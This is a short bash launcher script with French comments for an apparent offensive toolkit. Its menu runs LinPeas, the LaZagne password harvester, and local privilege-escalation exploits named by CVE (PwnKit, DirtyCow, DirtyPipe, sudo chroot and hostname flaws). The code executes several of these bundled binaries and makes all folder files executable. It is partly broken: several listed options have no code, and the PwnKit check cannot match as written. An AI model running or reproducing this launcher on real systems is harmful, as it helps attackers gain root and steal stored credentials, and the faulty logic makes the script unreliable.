#!/bin/bash

arch="64 32"

if [[ "$*" == "-help" ]]; then
    echo "cmd:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo "   -DirtyCow      DirtyCow - CVE-2016-5195"
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
    echo "   -Chroot        Sudo Chroot - CVE-2025-32463"
    echo "   -SudoHost      Sudo Hostname - CVE-2025-32462 "
    echo "   -check         Verifie si gcc & python est installer"
    echo "   -perm          Application des droit sur le dossier fullEx"
    exit 0
fi

# Application des droit sur le dossier fullEx
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
   "${PWD}/PwnKit/PwnKit${arch}"
fi

# Sudo-Host
if [[ "$*" == "-SudoHost" ]]; then
     "${PWD}/Sudo-host/exploit"
fi
